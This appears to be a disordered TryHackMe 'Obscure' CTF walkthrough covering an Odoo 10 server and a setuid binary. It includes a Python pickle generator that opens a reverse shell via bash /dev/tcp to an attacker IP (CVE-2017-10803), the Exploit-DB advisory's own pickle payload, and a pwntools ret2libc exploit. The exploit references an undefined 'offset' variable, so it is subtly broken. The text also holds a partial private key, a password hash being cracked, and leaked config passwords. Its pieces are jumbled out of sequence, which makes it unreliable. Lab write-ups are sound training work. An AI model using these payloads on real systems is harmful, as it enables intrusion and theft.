/usr/bin/gpasswd
/usr/bin/passwd		--->	Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
/ret

[+] SGID
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands
/usr/bin/expiry
/usr/bin/chage
/usr/bin/wall
/usr/bin/ssh-agent
/sbin/unix_chkpwd

[+] Writable folders configured in /etc/ld.so.conf.d/
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#etc-ld-so-conf-d
/usr/local/lib
/lib/x86_64-linux-gnu
/usr/lib/x86_64-linux-gnu

[+] Capabilities
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities

[+] Users with capabilities
/etc/security/capability.conf Not Found



__




<img width="1752" height="328" alt="image" src="https://github.com/user-attachments/assets/3a593320-0359-436a-9424-23e09d2840e6" />



<img width="1750" height="524" alt="image" src="https://github.com/user-attachments/assets/19d5ca48-ddfa-4711-9735-ee3c185f5c2b" />


<img width="1753" height="377" alt="image" src="https://github.com/user-attachments/assets/aa7df21d-e188-4dfc-9616-30d228584cc6" />


odoo@b8a9bbf1f380:/$ nc -nlvp 8888 < ret
nc -nlvp 8888 < ret
Ncat: Version 6.47 ( http://nmap.org/ncat )
Ncat: Listening on :::8888
Ncat: Listening on 0.0.0.0:8888

<br>

<br>
<br>
<br>
<br>


```bash
:~/Obscure# cat .ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAxuNhK456dD+WXwoMLkfzQPvBsbnN27Aq8NfCVp4625XyoXi+
...
zEZCM96+u7ztQ4SbQdQyoxvvlHT/ndXx6XGJZLumWNjo0yLWHrt4oEBdXXyKnsoc
Xd7vdmN3yLBxPy/oLniacvcYUPsXwhLOGkumAgPPevzJsn+MHvxm5JQ6U0/MrM3S
aR/dJVG0ySki5Gtv/7YLW8kCgYEAhKCtLe684OcOI/g830rDwgHW6oXiDyKsxtHR
/13rJbeBIitWlmz5D3z9mvqRIbhc8IA8SCfYiRKz1WHxNjRJukdc0FDeLsjtPFqd
oudjDNXGitbgEHFzeQg+7slgOtDLQs0Wn0daumcfctB7oiJX5fMyHvj43Fl7/64K
PAHY6rkCgYEAsVk6DjjzRQCAMoyC9H4bwAWMkvYerSkmvIo3efCMyUdKtMjg3cCv
EFmGDkEL3l6/2W3bmF6kbYDOeSyRjAaZp59QUiNliiHneD9VwCVXT/IF70O+kNkf
c7FgDFMEoa44S7BZIhxymHyGN7xgPQ6EJonUuMCfmP83KLRZrkI4FPI=
-----END RSA PRIVATE KEY-----
```

<br>

```bash
:~/Obscure#  chmod 600 id_rsa
```

<br>



odoo@b8a9bbf1f380:/tmp$ getent hosts
getent hosts
127.0.0.1       localhost
127.0.0.1       localhost ip6-localhost ip6-loopback
172.17.0.2      db b5cc3d65e489 unkkuri-db
172.17.0.3      b8a9bbf1f380


odoo@b8a9bbf1f380:/tmp$ ss
ss
Netid  State      Recv-Q Send-Q   Local Address:Port       Peer Address:Port   
tcp    ESTAB      0      0           172.17.0.3:60994        172.17.0.2:postgresql 
tcp    ESTAB      0      0           172.17.0.3:60990        172.17.0.2:postgresql 
tcp    ESTAB      0      0           172.17.0.3:60992        172.17.0.2:postgresql 
tcp    ESTAB      0      0           172.17.0.3:42798     10.201.47.153:1234    
tcp    ESTAB      0      0           172.17.0.3:8069      10.201.47.153:35918   
tcp    ESTAB      0      0           172.17.0.3:60986        172.17.0.2:postgresql 





odoo@b8a9bbf1f380:/tmp$ curl http://10.201.47.153:8000/nmap-x64.tar.gz -o nmap-x64.tar.gz
<l http://10.201.47.153:8000/nmap-x64.tar.gz -o nmap-x64.tar.gz              
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 10.1M  100 10.1M    0     0   105M      0 --:--:-- --:--:-- --:--:--  106M
odoo@b8a9bbf1f380:/tmp$ 



odoo@b8a9bbf1f380:/tmp$ tar -xzf nmap-x64.tar.gz
tar -xzf nmap-x64.tar.gz
odoo@b8a9bbf1f380:/tmp$ 


<p> 172.17.0.1 has port 4444 open</p>

odoo@b8a9bbf1f380:/tmp$ ./nmap -Pn 172.17.0/24



<img width="840" height="341" alt="image" src="https://github.com/user-attachments/assets/86baec93-e316-4e56-9dd6-c7372083b0cf" />


ifconfig

<img width="463" height="454" alt="image" src="https://github.com/user-attachments/assets/b6921044-a3db-40ce-b1c6-4e9c8ebd271d" />








```bash
:~/Obscure# ssh -i id_rsa zeeshan@xx.xxx.xxx.xxx
```

<br>
<br>

<img width="1212" height="605" alt="image" src="https://github.com/user-attachments/assets/5fd6b9af-dc24-43f3-83ee-8d807440c7ec" />

<br>
<br>

```bash
zeeshan@hydra:~$ pwd
/home/zeeshan
```

<br>

```bash
zeeshan@hydra:~$ cat user.txt
THM{43b0b68ba2755dd6cac3b8bf5454db94}
```

<br>
<br>

```bash
zeeshan@hydra:~$ netstat -tunlp
...
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 172.17.0.1:4444         0.0.0.0:*               LISTEN      1797/socat      
tcp        0      0 127.0.0.1:36768         0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               
tcp6       0      0 :::21                   :::*                    LISTEN      -               
tcp6       0      0 :::22                   :::*                    LISTEN      -               
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -          
```

<br>

<br>

<h3>zeeshan´s privileges</h3>

```bash
zeeshan@hydra:~$ sudo -l
Matching Defaults entries for zeeshan on hydra:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User zeeshan may run the following commands on hydra:
    (ALL : ALL) ALL
    (root) NOPASSWD: /exploit_me
```

<br>

<br>
<br>
<h3>ret</h3><br>

<br>
<br>


```bash
:~/Obscure# curl http://xx.xxx.xxx.xxx:8000/ret -o ret
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  8864  100  8864    0     0  4328k      0 --:--:-- --:--:-- --:--:-- 4328k
```

<br>


```bash
zeeshan@hydra:~$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 ...
xx.xxx.xx.xxx - - [17/Aug/2025 xx:xx:xx] "GET /ret HTTP/1.1" 200 -
```

<br>

```bash
:~/Obscure# chmod 777 ret
```

<br>

```bash
:~/Obscure# file ret
ret: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=3c3a9e9f974de13925f0644178007bdbf22576e3, not stripped
```

<br>
<h3>Ghidra</h3>

<br>
<br>

<img width="636" height="473" alt="image" src="https://github.com/user-attachments/assets/95d7cc23-1e68-4379-a5a1-58a8f0e9a550" />


<br>

<p>main()</p>

undefined8 main(void)

{
  vuln();
  return 0;
}

<p>vul()</p>


void vuln(void)

{
  char local_88 [128];
  
  fwrite("Exploit this binary to get on the box!\nWhat do you have for me?\n",1,0x40,stdout);
  fflush(stdout);
  gets(local_88);
  return;
}



<br>
<br>
<h3>exploit_me</h3>

```bash
zeeshan@hydra:/$ ls
bin   dev  exploit_me  initrd.img      lib    lost+found  mnt  proc  run   snap  sys  usr  vmlinuz
boot  etc  home        initrd.img.old  lib64  media       opt  root  sbin  srv   tmp  var  vmlinuz.old
```

<br>

```bash
:~/Obscure# curl http://xx.xxx.xxx.xxx:8000/exploit_me -o exploit_me
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  8712  100  8712    0     0  2835k      0 --:--:-- --:--:-- --:--:-- 2835k
```

<br>


```bash
:~/Obscure# chmod 777 exploit_me
```

checksec


<img width="455" height="260" alt="image" src="https://github.com/user-attachments/assets/3ee6ae65-4e0a-4f31-aaf9-2fda1ecc2413" />


<br>
<br>
<h4>Ghidra</h4>

<br>

<img width="1293" height="738" alt="image" src="https://github.com/user-attachments/assets/d1aa2118-7527-4fc4-9135-67bffebdff1d" />

<br>
<br>




gdb exploit_me

(gdb) x $rsp
0x7ffcc8e21018:	0x61616161

zeeshan@hydra:/$ ldd /exploit_me
	linux-vdso.so.1 =>  (0x00007ffd0e73a000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb0b983f000)
	/lib64/ld-linux-x86-64.so.2 (0x00007fb0b9c09000)







<img width="836" height="431" alt="image" src="https://github.com/user-attachments/assets/abb3bfb7-9b39-44a9-a72b-f3fb84909448" />



```bash
undefined8 main(void)

{
  char local_28 [32];
  
  setuid(0);
  puts("Exploit this binary for root!");
  gets(local_28);
  return 0;
}
```




<br>

```bash
:~/Obscure# ldd exploit_me
	linux-vdso.so.1 (0x00007ffc7a3bc000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fd1a5b90000)
	/lib64/ld-linux-x86-64.so.2 (0x00007fd1a5da1000)
```

<br>


```bash
:~/Obscure# cp /lib/x86_64-linux-gnu/libc.so.6 ./libc.so.6
```

<br>

```bash
:~/Obscure# # ldd exploit_me
	linux-vdso.so.1 (0x00007ffcb2ab1000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f6b64dea000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f6b64ffb000)
```




<p><em>https://0xrodon.medium.com/tryhackme-obscure-walkthrough-obscure-ctf-e2eb82ff5245</em></p>

```bash
:~/Obscure# cat exploit.py
#!/usr/bin/python
from pwn import *

elf = context.binary = ELF('./exploit_me', checksec=False)
libc = elf.libc

# Connect via SSH using the private key for authentication
s = ssh(host='10.201.124.236', user='zeeshan', keyfile='id_rsa')

# Run the binary on the remote host
p = s.run('./exploit_me')

# Prepare the payload
prefix = b"a" * 40
pop_rdi = p64(next(elf.search(asm("pop rdi; ret"))))
go_gets = p64(elf.got.gets)
go_puts = p64(elf.got.puts)
fn_puts = p64(elf.plt.puts)
fn_main = p64(elf.symbols.main)

payload = (prefix + pop_rdi + go_gets + fn_puts +
pop_rdi + go_puts + fn_puts +
fn_main)

# Send the payload and receive the response
p.clean()
p.sendline(payload)

# Read addresses from the response
gets_addr = u64(p.recvline().strip().ljust(8, b'\x00'))
puts_addr = u64(p.recvline().strip().ljust(8, b'\x00'))
print('Gets :'  + hex(gets_addr)[-5:])
print('Puts :'  + hex(puts_addr)[-5:])

# Calculate the addresses for system and /bin/sh
libc_base = gets_addr - 0x6ed90 # address found on libc.rip after first execution
bin_sh = p64(offset + 0x18ce57) # address of /bin/sh
system = p64(offset + 0x453a0) # address of system

# Prepare the final payload
payload = prefix + pop_rdi + bin_sh + system

# Send the final payload
p.clean()
p.sendline(payload)

# Interact with the shell
p.interactive()
```

<br>
<br>



```bash
admin@antisoft.thm  Administrator $pbkdf2-sha512$12000$lBJiDGHMOcc4Zwwh5Dzn/A$x.EZ/PrEodzEJ5r4JfQo2KsMZLkLT97xWZ3LsMdgwMuK1Ue.YCzfElODfWEGUOc7yYBB4fMt87ph8Sy5tN4nag
```

```bash
 admin@antisoft.thm  Administrator $pbkdf2-sha512$12000$lBJiDGHMOcc4Zwwh5Dzn/A$x.EZ/PrEodzEJ5r4JfQo2KsMZLkLT97xWZ3LsMdgwMuK1Ue.YCzfElODfWEGUOc7yYBB4fMt87ph8Sy5tN4nag
```

```bash
:~/Obscure/main_2026-02-08_14-32-57# cat Hash
admin@antisoft.thm:$pbkdf2-sha512$12000$lBJiDGHMOcc4Zwwh5Dzn/A$x.EZ/PrEodzEJ5r4JfQo2KsMZLkLT97xWZ3LsMdgwMuK1Ue.YCzfElODfWEGUOc7yYBB4fMt87ph8Sy5tN4nag
```

```bash
:~/Obscure/main_2026-02-08_14-32-57# echo '$pbkdf2-sha512$12000$lBJiDGHMOcc4Zwwh5Dzn/A$x.EZ/PrEodzEJ5r4JfQo2KsMZLkLT97xWZ3LsMdgwMuK1Ue.YCzfElODfWEGUOc7yYBB4fMt87ph8Sy5tN4nag' > Hash
```

```bash
:~/Obscure/main_2026-02-08_14-32-57# ap install hashid
```

```bash
:~/Obscure/main_2026-02-08_14-32-57# hashid --help
usage: hashid.py [-h] [-e] [-m] [-j] [-o FILE] [--version] INPUT

Identify the different types of hashes used to encrypt data

positional arguments:
  INPUT                    input to analyze (default: STDIN)

options:
  -e, --extended           list all possible hash algorithms including salted passwords
  -m, --mode               show corresponding Hashcat mode in output
  -j, --john               show corresponding JohnTheRipper format in output
  -o FILE, --outfile FILE  write output to file
  -h, --help               show this help message and exit
  --version                show program's version number and exit

License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
```

```bash
:~/Obscure/main_2026-02-08_14-32-57# john --list=formats | grep -i pbkdf2
PBKDF2-HMAC-MD4, PBKDF2-HMAC-MD5, PBKDF2-HMAC-SHA1, PBKDF2-HMAC-SHA256, 
PBKDF2-HMAC-SHA512, PDF, PEM, pfx, pgpdisk, pgpsda, pgpwde, phpass, PHPS, 
oldoffice-opencl, PBKDF2-HMAC-MD4-opencl, PBKDF2-HMAC-MD5-opencl, 
PBKDF2-HMAC-SHA1-opencl, rar-opencl, RAR5-opencl, TrueCrypt-opencl, 
OpenBSD-SoftRAID-opencl, PBKDF2-HMAC-SHA256-opencl, 
PBKDF2-HMAC-SHA512-opencl, pem-opencl, pfx-opencl, pgpdisk-opencl, 
```

```bash
:~/Obscure/main_2026-02-08_14-32-57# hashid -m -j '$pbkdf2-sha512$12000$lBJiDGHMOcc4Zwwh5Dzn/A$x.EZ/PrEodzEJ5r4JfQo2KsMZLkLT97xWZ3LsMdgwMuK1Ue.YCzfElODfWEGUOc7yYBB4fMt87ph8Sy5tN4nag'
Analyzing '$pbkdf2-sha512$12000$lBJiDGHMOcc4Zwwh5Dzn/A$x.EZ/PrEodzEJ5r4JfQo2KsMZLkLT97xWZ3LsMdgwMuK1Ue.YCzfElODfWEGUOc7yYBB4fMt87ph8Sy5tN4nag'
[+] PBKDF2-SHA512(Generic) 
```


```bash
:~/Obscure/main_2026-02-08_14-32-57# john --format=PBKDF2-HMAC-SHA512 --wordlist=/usr/share/wordlists/rockyou.txt Hash
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA224 [password is key, SHA224 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:17 DONE (2026-02-08 14:43) 0g/s 827683p/s 827683c/s 827683C/s !Sketchy!..*7¡Vamos!
Session completed. 
```


```bash
:~/Obscure# searchsploit Odoo 10.0
--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                               |  Path
--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Odoo CRM 10.0 - Code Execution                                                                                                               | linux/local/44064.md
--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

```bash
root@ip-10-81-91-142:~/Obscure# searchsploit -m linux/local/44064.md
  Exploit: Odoo CRM 10.0 - Code Execution
      URL: https://www.exploit-db.com/exploits/44064
     Path: /opt/exploitdb/exploits/linux/local/44064.md
    Codes: CVE-2017-10803
 Verified: False
File Type: Python script, UTF-8 Unicode text executable, with very long lines
Copied to: /root/Obscure/44064.md
```

```bash
root@ip-10-81-91-142:~/Obscure# ls
44064.md  exploit.py  main_2026-02-08_14-32-57  main_2026-02-08_14-32-57.zip  notice.txt  password  spassword
root@ip-10-81-91-142:~/Obscure# cat 44064.md
## Vulnerability Summary
The following advisory describe arbitrary Python code execution found in Odoo CRM version 10.0

Odoo is a suite of open source business apps that cover all your company needs: CRM, eCommerce, accounting, inventory, point of sale, project management, etc. Odoo\u2019s unique value proposition is to be at the same time very easy to use and fully integrated.

## Credit
An independent security researcher has reported this vulnerability to Beyond Security\u2019s SecuriTeam Secure Disclosure program.

## Vendor response
Odoo has done a private disclosure for the issue we reported, and the patch was merged in all supported branches.
CVE: CVE-2017-10803

The full public disclosure will be available at https://github.com/odoo/odoo/issues/17898.

## Vulnerability Details
One of the core Odoo modules, Database Anonymization, allows an administrator to anonymize the contents of the Odoo database. The module does this by serializing the contents of the existing database using Python\u2019s pickle module into a backup file before modifying the contents of the database. The administrator can then de-anonymize the database by loading the pickled backup file.

Python\u2019s pickle module can be made to execute arbitrary Python code when loading an attacker controlled pickle file. With this, an administrator can execute arbitrary Python code with the same privilege level as the Odoo webapp by anonymizing the database then attempt the de-anonymization process with a crafted pickle file.

## Proof of Concept
In order to exploit the vulnerability, you should navigate to the Apps page (the link is in the navigation bar at the top and search for and install \u201cDatabase Anonymization\u201d in the search bar. We have to deselect the \u201cApps\u201d filter in the search bar for it to show up.

Once we have the module installed, we navigate to the settings page and select \u201cAnonymize database\u201d under \u201cDatabase anonymization\u201d and click on the \u201cAnonymize Database\u201d button. Next, we refresh the page and navigate to the same page under settings. We upload the \u201cexploit.pickle\u201d file generated our script and click on \u201cReverse the Database Anonymization\u201d button. We should have a reverse shell.

The following Python file generate a malicious pickle file that attempts (via bash) to connect back to a listener on port 8000:


import cPickle
import os
import base64
import pickletools

class Exploit(object):
def __reduce__(self):
return (os.system, (("bash -i >& /dev/tcp/127.0.0.1/8000 0>&1"),))

with open("exploit.pickle", "wb") as f:
cPickle.dump(Exploit(), f, cPickle.HIGHEST_PROTOCOL)


We then use netcat listener on port 8000:


ncat -nlvp 8000

```

<p>

- Disable <strong>Apps</strong> in the <strong>Search</strong> field<br>
- Search for <strong>Database</strong><br>
- Click <strong>Install</strong> on <strong>Database Anonymization</strong></p>


<img width="1105" height="272" alt="image" src="https://github.com/user-attachments/assets/c4e5c851-aa34-4267-88a4-c707e8546a8e" />

<br>
<br>
<p>

- Navigate to <strong>Settings</strong></p>

<img width="1084" height="137" alt="image" src="https://github.com/user-attachments/assets/897909aa-68cf-43ae-8da1-15a843d32c2d" />

<br>
<br>
<p>

- Click <strong>Anonymize database</strong><br>
- Click <strong>Anonymize database</strong></p>


<img width="1102" height="490" alt="image" src="https://github.com/user-attachments/assets/4f01056f-d6e2-47e4-9df4-c8bb0435054c" />

<img width="1008" height="448" alt="image" src="https://github.com/user-attachments/assets/5b351e08-6ae0-44ad-87be-8df7448d7766" />

<br>
<br>
<p>

- Refresh</p>

<img width="1097" height="436" alt="image" src="https://github.com/user-attachments/assets/7de20d95-200d-4a99-9638-45c3eb2a20cd" />

<br>
<br>
<p>

- Click <strong>Upload your file</strong><br>
- Browse, Select <conde>exploit.pickle</code> and click <strong>Open</strong></p>

<img width="1101" height="423" alt="image" src="https://github.com/user-attachments/assets/1f57a968-e23b-4e76-bb4f-54d308dd4b07" />

<br>
<br>


import pickle
import os
import base64

class Exploit(object):
    def __reduce__(self):
        # Python 2.7 friendly system call
        cmd = "bash -c 'bash -i >& /dev/tcp/10.81.91.142/4444 0>&1'"
        return (os.system, (cmd,))

# protocol=0 creates an ASCII-only pickle, which is the most stable for Python 2.7
payload = pickle.dumps(Exploit(), protocol=0)

# 1. Print the string for your reference
print("Base64 Payload: " + base64.b64encode(payload).decode())

# 2. Automatically save the file to your current folder
with open('exploit.pickle', 'wb') as f:
    f.write(payload)

print("\nSuccess! 'exploit.pickle' has been generated in your current directory.")






:~/Obscure# nano c.py


:~/Obscure# python3 c.py
Base64 Payload: Y3Bvc2l4CnN5c3RlbQpwMAooVmJhc2ggLWMgJ2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuODEuOTEuMTQyLzQ0NDQgMD4mMScKcDEKdHAyClJwMwou

Success! 'exploit.pickle' has been generated in your current directory.



:~/Obscure# cat exploit.pickle
gASVTwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjDRiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjgxLjkxLjE0Mi80NDQ0IDA+JjEnlIWUUpQu


<p>

- Upload<br>
- Click <strong>Save</strong></p>

<img width="1101" height="492" alt="image" src="https://github.com/user-attachments/assets/cd2a928a-ed1e-4932-a423-b182097022c9" />


<img width="1102" height="458" alt="image" src="https://github.com/user-attachments/assets/2a8f4fcc-973d-4dc9-88d5-38a0fb3f8284" />


<br>
<br>
<p>

- Click <strong>Save</strong></p>


<img width="1100" height="480" alt="image" src="https://github.com/user-attachments/assets/10a34675-618c-4b30-9be3-5b4e4ab92dea" />

<br>
<br>
<p>

- Click the <strong>Reverse the Database Anonymization</strong></p>

<img width="1106" height="588" alt="image" src="https://github.com/user-attachments/assets/351a7196-6e16-493f-ba6d-cdb960526229" />

<br>
<br>


<p>

- Click <strong>Create</strong></p>

<img width="1105" height="443" alt="image" src="https://github.com/user-attachments/assets/fdb95465-a45d-4619-be53-22ee28073a02" />

<p>

- check your listener</strong></p>


<img width="1109" height="248" alt="image" src="https://github.com/user-attachments/assets/1760187c-b952-4ef0-8f42-b71e0dacb8ef" />


odoo@b8a9bbf1f380:~$ ^Z
[1]+  Stopped                 nc -nlvp 4444
root@ip-10-81-91-142:~/Obscure# stty raw -echo; fg
nc -nlvp 4444

odoo@b8a9bbf1f380:~$ export TERM=xterm



odoo@b8a9bbf1f380:~$ pwd
pwd
/var/lib/odoo
odoo@b8a9bbf1f380:~$ ls -lah
ls -lah
total 892K
drwxr-xr-x 5 odoo odoo 4.0K Feb 22  2023 .
drwxr-xr-x 1 root root 4.0K Oct 17  2019 ..
lrwxrwxrwx 1 root root    9 Feb 22  2023 .bash_history -> /dev/null
drwx------ 3 odoo odoo 4.0K Jul 23  2022 addons
-rw-r--r-- 1 odoo odoo 1.4K Feb  8 15:16 field_anonymization_main_1.pickle
drwxr-xr-x 3 odoo odoo 4.0K Jul 23  2022 filestore
-rw-r--r-- 1 root root   38 Feb 22  2023 flag.txt
drwx------ 2 odoo odoo 864K Feb  8 15:22 sessions
odoo@b8a9bbf1f380:~$ cat flag.txt
cat flag.txt
THM{1243b64a3a01a8732ccb96217f593520}
odoo@b8a9bbf1f380:~$ 


<img width="1102" height="306" alt="image" src="https://github.com/user-attachments/assets/c28eab12-5acc-49dd-ab19-30d02028f17c" />





odoo@b8a9bbf1f380:/$ find / -perm -4000 -ls 2>/dev/null
156001   40 -rwsr-xr-x   1 root     root        40000 Mar 29  2015 /bin/mount
156039   28 -rwsr-xr-x   1 root     root        27416 Mar 29  2015 /bin/umount
156006   44 -rwsr-xr-x   1 root     root        44104 Nov  8  2014 /bin/ping
156007   44 -rwsr-xr-x   1 root     root        44552 Nov  8  2014 /bin/ping6
156022   40 -rwsr-xr-x   1 root     root        40168 May 17  2017 /bin/su
142767  456 -rwsr-xr-x   1 root     root       464904 Mar 25  2019 /usr/lib/openssh/ssh-keysign
156958   40 -rwsr-xr-x   1 root     root        39912 May 17  2017 /usr/bin/newgrp
156863   44 -rwsr-xr-x   1 root     root        44464 May 17  2017 /usr/bin/chsh
156861   56 -rwsr-xr-x   1 root     root        53616 May 17  2017 /usr/bin/chfn
156909   76 -rwsr-xr-x   1 root     root        75376 May 17  2017 /usr/bin/gpasswd
156970   56 -rwsr-xr-x   1 root     root        54192 May 17  2017 /usr/bin/passwd
 10150   12 -rwsr-xr-x   1 root     root         8864 Jul 23  2022 /ret
odoo@b8a9bbf1f380:/$ ls -lah
total 88K
drwxr-xr-x   1 root root 4.0K Jul 26  2022 .
drwxr-xr-x   1 root root 4.0K Jul 26  2022 ..
-rwxr-xr-x   1 root root    0 Jul 23  2022 .dockerenv
drwxr-xr-x   1 root root 4.0K Jul 23  2022 bin
drwxr-xr-x   2 root root 4.0K Jun 14  2018 boot
drwxr-xr-x   5 root root  340 Feb  8 14:04 dev
-rwxrwxr-x   1 root root 1.1K Oct 17  2019 entrypoint.sh
drwxr-xr-x   1 root root 4.0K Jul 23  2022 etc
drwxr-xr-x   2 root root 4.0K Jun 14  2018 home
drwxr-xr-x   1 root root 4.0K Oct 17  2019 lib
drwxr-xr-x   2 root root 4.0K Oct 14  2019 lib64
drwxr-xr-x   2 root root 4.0K Oct 14  2019 media
drwxr-xr-x   1 root root 4.0K Oct 17  2019 mnt
drwxr-xr-x   2 root root 4.0K Oct 14  2019 opt
dr-xr-xr-x 136 root root    0 Feb  8 14:04 proc
-rwsr-xr-x   1 root root 8.7K Jul 23  2022 ret
drwx------   1 root root 4.0K Jul 23  2022 root
drwxr-xr-x   1 root root 4.0K Oct 17  2019 run
drwxr-xr-x   1 root root 4.0K Oct 17  2019 sbin
drwxr-xr-x   2 root root 4.0K Oct 14  2019 srv
dr-xr-xr-x  13 root root    0 Feb  8 14:04 sys
drwxrwxrwt   1 root root 4.0K Feb  8 14:33 tmp
drwxr-xr-x   1 root root 4.0K Oct 14  2019 usr
drwxr-xr-x   1 root root 4.0K Oct 14  2019 var
odoo@b8a9bbf1f380:/$ cat entrypoint.sh
#!/bin/bash

set -e

# set the postgres database host, port, user and password according to the environment
# and pass them as arguments to the odoo process if not present in the config file
: ${HOST:=${DB_PORT_5432_TCP_ADDR:='db'}}
: ${PORT:=${DB_PORT_5432_TCP_PORT:=5432}}
: ${USER:=${DB_ENV_POSTGRES_USER:=${POSTGRES_USER:='odoo'}}}
: ${PASSWORD:=${DB_ENV_POSTGRES_PASSWORD:=${POSTGRES_PASSWORD:='odoo'}}}

DB_ARGS=()
function check_config() {
    param="$1"
    value="$2"
    if ! grep -q -E "^\s*\b${param}\b\s*=" "$ODOO_RC" ; then
        DB_ARGS+=("--${param}")
        DB_ARGS+=("${value}")
   fi;
}
check_config "db_host" "$HOST"
check_config "db_port" "$PORT"
check_config "db_user" "$USER"
check_config "db_password" "$PASSWORD"

case "$1" in
    -- | odoo)
        shift
        if [[ "$1" == "scaffold" ]] ; then
            exec odoo "$@"
        else
            exec odoo "$@" "${DB_ARGS[@]}"
        fi
        ;;
    -*)
        exec odoo "$@" "${DB_ARGS[@]}"
        ;;
    *)
        exec "$@"
esac

exit 1



db =
Port: 5432
User: oddo
Password: oddo




odoo@b8a9bbf1f380:/$ find /etc/ -name "*.conf" 2>/dev/null | grep odoo
/etc/odoo/odoo.conf
odoo@b8a9bbf1f380:/$ cat /etc/odoo/odoo.conf
[options]
addons_path = /mnt/extra-addons,/usr/lib/python2.7/dist-packages/odoo/addons
admin_passwd = SecurePassword123!
csv_internal_sep = ,
data_dir = /var/lib/odoo
db_host = 172.17.0.2
db_maxconn = 64
db_name = False
db_password = unkkuri-secret-pw
db_port = 5432
db_template = template1
db_user = odoo
dbfilter = .*
demo = {}
email_from = False
geoip_database = /usr/share/GeoIP/GeoLite2-City.mmdb
import_partial = 
limit_memory_hard = 2684354560
limit_memory_soft = 2147483648
limit_request = 8192
limit_time_cpu = 60
limit_time_real = 120
limit_time_real_cron = -1
list_db = True
log_db = False
log_db_level = warning
log_handler = :INFO
log_level = info
logfile = None
logrotate = False
longpolling_port = 8072
max_cron_threads = 2
osv_memory_age_limit = 1.0
osv_memory_count_limit = False
pg_path = None
pidfile = None
proxy_mode = False
reportgz = False
server_wide_modules = web,web_kanban
smtp_password = False
smtp_port = 25
smtp_server = localhost
smtp_ssl = False
smtp_user = False
syslog = False
test_commit = False
test_enable = False
test_file = False
test_report_directory = False
translate_modules = ['all']
unaccent = False
without_demo = False
workers = 0
xmlrpc = True
xmlrpc_interface = 
xmlrpc_port = 8069

odoo@b8a9bbf1f380:/$ 







Host: 172.17.0.2

User: odoo

Password: unkkuri-secret-pw

Admin/Master Password: SecurePassword123!





odoo@b8a9bbf1f380:/$ psql -h 172.17.0.2 -U odoo -d main
Password for user odoo: 
psql (11.5 (Debian 11.5-3.pgdg80+1), server 9.4.26)
Type "help" for help.

main=# \l
                             List of databases
   Name    | Owner | Encoding |  Collate   |   Ctype    | Access privileges 
-----------+-------+----------+------------+------------+-------------------
 main      | odoo  | UTF8     | en_US.utf8 | en_US.utf8 | 
 postgres  | odoo  | UTF8     | en_US.utf8 | en_US.utf8 | 
 template0 | odoo  | UTF8     | en_US.utf8 | en_US.utf8 | =c/odoo          +
           |       |          |            |            | odoo=CTc/odoo
 template1 | odoo  | UTF8     | en_US.utf8 | en_US.utf8 | =c/odoo          +
           |       |          |            |            | odoo=CTc/odoo
(4 rows)

main=# \dt
                           List of relations
 Schema |                     Name                      | Type  | Owner 
--------+-----------------------------------------------+-------+-------
 public | anonymized_field_to_history_rel               | table | odoo
 public | base_import_import                            | table | odoo
 public | base_import_tests_models_char                 | table | odoo
 public | base_import_tests_models_char_noreadonly      | table | odoo
 public | base_import_tests_models_char_readonly        | table | odoo
 public | base_import_tests_models_char_required        | table | odoo
 public | base_import_tests_models_char_states          | table | odoo
 public | base_import_tests_models_char_stillreadonly   | table | odoo
 public | base_import_tests_models_m2o                  | table | odoo
 public | base_import_tests_models_m2o_related          | table | odoo
 public | base_import_tests_models_m2o_required         | table | odoo
 public | base_import_tests_models_m2o_required_related | table | odoo
 public | base_import_tests_models_o2m                  | table | odoo
 public | base_import_tests_models_o2m_child            | table | odoo
 public | base_import_tests_models_preview              | table | odoo
 public | base_language_export                          | table | odoo
 public | base_language_import                          | table | odoo
 public | base_language_install                         | table | odoo
 public | base_module_configuration                     | table | odoo
 public | base_module_update                            | table | odoo
 public | base_module_upgrade                           | table | odoo
 public | base_update_translations                      | table | odoo
 public | change_password_user                          | table | odoo
 public | change_password_wizard                        | table | odoo
 public | ir_act_client                                 | table | odoo
 public | ir_act_report_xml                             | table | odoo
 public | ir_act_server                                 | table | odoo
 public | ir_act_url                                    | table | odoo
 public | ir_act_window                                 | table | odoo
 public | ir_act_window_group_rel                       | table | odoo
 public | ir_act_window_view                            | table | odoo
 public | ir_actions                                    | table | odoo
